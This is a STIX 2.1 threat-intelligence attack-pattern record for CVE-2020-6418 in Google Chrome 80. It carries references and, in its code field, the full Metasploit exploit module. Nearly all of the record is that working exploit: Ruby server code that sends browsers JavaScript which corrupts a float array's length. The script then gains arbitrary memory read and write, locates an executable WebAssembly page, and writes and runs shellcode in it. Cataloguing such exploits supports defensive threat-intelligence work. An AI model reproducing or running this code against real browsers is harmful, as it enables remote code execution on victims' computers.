{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03bcd5c6-dd7e-4ef2-9e7b-e56e5e5f282c",
    "created": "2024-08-14T17:05:53.338388Z",
    "modified": "2024-08-14T17:05:53.338392Z",
    "name": "Google Chrome 80 JSCreate side-effect type confusion exploit",
    "description": " This module exploits an issue in Google Chrome 80.0.3987.87 (64 bit). The exploit corrupts the length of a float array (float_rel), which can then be used for out of bounds read and write on adjacent memory. The relative read and write is then used to modify a UInt64Array (uint64_aarw) which is used for read and writing from absolute memory. The exploit then uses WebAssembly in order to allocate a region of RWX memory which is then replaced with the payload shellcode. The payload is executed within the sandboxed renderer process, so the browser must be run with the --no-sandbox option for the payload to work correctly.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/chrome_jscreate_sideeffect.rb",
            "external_id": "chrome_jscreate_sideeffect.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-6418"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=1053604"
        },
        {
            "source_name": "reference",
            "url": "https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping"
        },
        {
            "source_name": "reference",
            "url": "https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer::BrowserExploit\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Google Chrome 80 JSCreate side-effect type confusion exploit',\n      'Description'    => %q{\n      This module exploits an issue in Google Chrome 80.0.3987.87 (64 bit). The exploit\n      corrupts the length of a float array (float_rel), which can then be used for out\n      of bounds read and write on adjacent memory.\n      The relative read and write is then used to modify a UInt64Array (uint64_aarw)\n      which is used for read and writing from absolute memory.\n      The exploit then uses WebAssembly in order to allocate a region of RWX memory,\n      which is then replaced with the payload shellcode.\n      The payload is executed within the sandboxed renderer process, so the browser\n      must be run with the --no-sandbox option for the payload to work correctly.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n          'Cl\u00e9ment Lecigne', # discovery\n          'Istv\u00e1n Kurucsai', # exploit\n          'Vignesh S Rao',   # exploit\n          'timwr', # metasploit copypasta\n        ],\n      'References'     => [\n          ['CVE', '2020-6418'],\n          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=1053604'],\n          ['URL', 'https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping'],\n          ['URL', 'https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90'],\n        ],\n      'Arch'           => [ ARCH_X64 ],\n      'DefaultTarget'  => 0,\n      'Notes' => {\n        'Reliability' => [ REPEATABLE_SESSION ],\n        'SideEffects' => [ IOC_IN_LOGS ],\n        'Stability' => [CRASH_SAFE]\n      },\n      'Targets'        =>\n        [\n          ['Windows 10 - Google Chrome 80.0.3987.87 (64 bit)', {'Platform' => 'win'}],\n          ['macOS - Google Chrome 80.0.3987.87 (64 bit)', {'Platform' => 'osx'}],\n        ],\n      'DisclosureDate' => '2020-02-19'))\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri} to #{request['User-Agent']}\")\n    escaped_payload = Rex::Text.to_unescape(payload.raw)\n    jscript = %Q^\nvar shellcode = unescape(\"#{escaped_payload}\");\n\n// HELPER FUNCTIONS\nlet conversion_buffer = new ArrayBuffer(8);\nlet float_view = new Float64Array(conversion_buffer);\nlet int_view = new BigUint64Array(conversion_buffer);\nBigInt.prototype.hex = function() {\n    return '0x' + this.toString(16);\n};\nBigInt.prototype.i2f = function() {\n    int_view[0] = this;\n    return float_view[0];\n}\nBigInt.prototype.smi2f = function() {\n    int_view[0] = this << 32n;\n    return float_view[0];\n}\nNumber.prototype.f2i = function() {\n    float_view[0] = this;\n    return int_view[0];\n}\nNumber.prototype.f2smi = function() {\n    float_view[0] = this;\n    return int_view[0] >> 32n;\n}\n\nNumber.prototype.fhw = function() {\n    float_view[0] = this;\n    return int_view[0] >> 32n;\n}\n\nNumber.prototype.flw = function() {\n    float_view[0] = this;\n    return int_view[0] & BigInt(2**32-1);\n}\n\nNumber.prototype.i2f = function() {\n    return BigInt(this).i2f();\n}\nNumber.prototype.smi2f = function() {\n    return BigInt(this).smi2f();\n}\n\nfunction hex(a) {\n    return a.toString(16);\n}\n\n//\n// EXPLOIT\n//\n\n// the number of holes here determines the OOB write offset\nlet vuln = [0.1, ,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];\nvar float_rel;      // float array, initially corruption target\nvar float_carw;     // float array, used for reads/writes within the compressed heap\nvar uint64_aarw;    // uint64 typed array, used for absolute reads/writes in the entire address space\nvar obj_leaker;     // used to implement addrof\nvuln.pop();\nvuln.pop();\nvuln.pop();\n\nfunction empty() {}\n\nfunction f(nt) {\n    // The compare operation enforces an effect edge between JSCreate and Array.push, thus introducing the bug\n    vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 156842065920.05);\n    for (var i = 0; i < 0x10000; ++i) {};\n}\n\nlet p = new Proxy(Object, {\n    get: function() {\n        vuln[0] = {};\n        float_rel = [0.2, 1.2, 2.2, 3.2, 4.3];\n        float_carw = [6.6];\n        uint64_aarw = new BigUint64Array(4);\n        obj_leaker = {\n            a: float_rel,\n            b: float_rel,\n        };\n\n        return Object.prototype;\n    }\n});\n\nfunction main(o) {\n  for (var i = 0; i < 0x10000; ++i) {};\n  return f(o);\n}\n\n// reads 4 bytes from the compressed heap at the specified dword offset after float_rel\nfunction crel_read4(offset) {\n    var qw_offset = Math.floor(offset / 2);\n    if (offset & 1 == 1) {\n        return float_rel[qw_offset].fhw();\n    } else {\n        return float_rel[qw_offset].flw();\n    }\n}\n\n// writes the specified 4-byte BigInt value to the compressed heap at the specified offset after float_rel\nfunction crel_write4(offset, val) {\n    var qw_offset = Math.floor(offset / 2);\n    // we are writing an 8-byte double under the hood\n    // read out the other half and keep its value\n    if (offset & 1 == 1) {\n        temp = float_rel[qw_offset].flw();\n        new_val = (val << 32n | temp).i2f();\n        float_rel[qw_offset] = new_val;\n    } else {\n        temp = float_rel[qw_offset].fhw();\n        new_val = (temp << 32n | val).i2f();\n        float_rel[qw_offset] = new_val;\n    }\n}\n\nconst float_carw_elements_offset = 0x14;\n\nfunction cabs_read4(caddr) {\n    elements_addr = caddr - 8n | 1n;\n    crel_write4(float_carw_elements_offset, elements_addr);\n    print('cabs_read4: ' + hex(float_carw[0].f2i()));\n    res = float_carw[0].flw();\n    // TODO restore elements ptr\n    return res;\n}\n\n\n// This function provides arbitrary within read the compressed heap\nfunction cabs_read8(caddr) {\n    elements_addr = caddr - 8n | 1n;\n    crel_write4(float_carw_elements_offset, elements_addr);\n    print('cabs_read8: ' + hex(float_carw[0].f2i()));\n    res = float_carw[0].f2i();\n    // TODO restore elements ptr\n    return res;\n}\n\n// This function provides arbitrary write within the compressed heap\nfunction cabs_write4(caddr, val) {\n    elements_addr = caddr - 8n | 1n;\n\n    temp = cabs_read4(caddr + 4n | 1n);\n    print('cabs_write4 temp: '+ hex(temp));\n\n    new_val = (temp << 32n | val).i2f();\n\n    crel_write4(float_carw_elements_offset, elements_addr);\n    print('cabs_write4 prev_val: '+ hex(float_carw[0].f2i()));\n\n    float_carw[0] = new_val;\n    // TODO restore elements ptr\n    return res;\n}\n\nconst objleaker_offset = 0x41;\nfunction addrof(o) {\n    obj_leaker.b = o;\n    addr = crel_read4(objleaker_offset) & BigInt(2**32-2);\n    obj_leaker.b = {};\n    return addr;\n}\n\nconst uint64_externalptr_offset = 0x1b;     // in 8-bytes\n\n// Arbitrary read. We corrupt the backing store of the `uint64_aarw` array and then read from the array\nfunction read8(addr) {\n    faddr = addr.i2f();\n    t1 = float_rel[uint64_externalptr_offset];\n    t2 = float_rel[uint64_externalptr_offset + 1];\n    float_rel[uint64_externalptr_offset] = faddr;\n    float_rel[uint64_externalptr_offset + 1] = 0.0;\n\n    val = uint64_aarw[0];\n\n    float_rel[uint64_externalptr_offset] = t1;\n    float_rel[uint64_externalptr_offset + 1] = t2;\n    return val;\n}\n\n// Arbitrary write. We corrupt the backing store of the `uint64_aarw` array and then write into the array\nfunction write8(addr, val) {\n    faddr = addr.i2f();\n    t1 = float_rel[uint64_externalptr_offset];\n    t2 = float_rel[uint64_externalptr_offset + 1];\n    float_rel[uint64_externalptr_offset] = faddr;\n    float_rel[uint64_externalptr_offset + 1] = 0.0;\n\n    uint64_aarw[0] = val;\n\n    float_rel[uint64_externalptr_offset] = t1;\n    float_rel[uint64_externalptr_offset + 1] = t2;\n    return val;\n}\n\n// Given an array of bigints, this will write all the elements to the address provided as argument\nfunction writeShellcode(addr, sc) {\n    faddr = addr.i2f();\n    t1 = float_rel[uint64_externalptr_offset];\n    t2 = float_rel[uint64_externalptr_offset + 1];\n    float_rel[uint64_externalptr_offset - 1] = 10;\n    float_rel[uint64_externalptr_offset] = faddr;\n    float_rel[uint64_externalptr_offset + 1] = 0.0;\n\n    for (var i = 0; i < sc.length; ++i) {\n        uint64_aarw[i] = sc[i]\n    }\n\n    float_rel[uint64_externalptr_offset] = t1;\n    float_rel[uint64_externalptr_offset + 1] = t2;\n}\n\n\nfunction get_compressed_rw() {\n\n    for (var i = 0; i < 0x10000; ++i) {empty();}\n\n    main(empty);\n    main(empty);\n\n    // Function would be jit compiled now.\n    main(p);\n\n    print(`Corrupted length of float_rel array = ${float_rel.length}`);\n}\n\nfunction get_arw() {\n    get_compressed_rw();\n    print('should be 0x2: ' + hex(crel_read4(0x15)));\n    let previous_elements = crel_read4(0x14);\n    //print(hex(previous_elements));\n    //print(hex(cabs_read4(previous_elements)));\n    //print(hex(cabs_read4(previous_elements + 4n)));\n    cabs_write4(previous_elements, 0x66554433n);\n    //print(hex(cabs_read4(previous_elements)));\n    //print(hex(cabs_read4(previous_elements + 4n)));\n\n    print('addrof(float_rel): ' + hex(addrof(float_rel)));\n    uint64_aarw[0] = 0x4142434445464748n;\n}\n\nfunction rce() {\n    function get_wasm_func() {\n        var importObject = {\n            imports: { imported_func: arg => print(arg) }\n        };\n        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];\n        wasm_code = new Uint8Array(bc);\n        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);\n        return wasm_mod.exports.exported_func;\n    }\n\n    let wasm_func = get_wasm_func();\n    //  traverse the JSFunction object chain to find the RWX WebAssembly code page\n    let wasm_func_addr = addrof(wasm_func);\n    let sfi = cabs_read4(wasm_func_addr + 12n) - 1n;\n    print('sfi: ' + hex(sfi));\n    let WasmExportedFunctionData = cabs_read4(sfi + 4n) - 1n;\n    print('WasmExportedFunctionData: ' + hex(WasmExportedFunctionData));\n\n    let instance = cabs_read4(WasmExportedFunctionData + 8n) - 1n;\n    print('instance: ' + hex(instance));\n\n    let wasm_rwx_addr = cabs_read8(instance + 0x68n);\n    print('wasm_rwx_addr: ' + hex(wasm_rwx_addr));\n\n    // write the shellcode to the RWX page\n    while(shellcode.length % 4 != 0){\n        shellcode += \"\\u9090\";\n    }\n\n    let sc = [];\n\n    // convert the shellcode to BigInt\n    for (let i = 0; i < shellcode.length; i += 4) {\n        sc.push(BigInt(shellcode.charCodeAt(i)) + BigInt(shellcode.charCodeAt(i + 1) * 0x10000) + BigInt(shellcode.charCodeAt(i + 2) * 0x100000000) + BigInt(shellcode.charCodeAt(i + 3) * 0x1000000000000));\n    }\n\n    writeShellcode(wasm_rwx_addr,sc);\n\n    print('success');\n    wasm_func();\n}\n\n\nfunction exp() {\n    get_arw();\n    rce();\n}\n\nexp();\n^\n\n    jscript = add_debug_print_js(jscript)\n    html = %Q^\n<html>\n<head>\n<script>\n#{jscript}\n</script>\n</head>\n<body>\n</body>\n</html>\n    ^\n    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-02-19"
}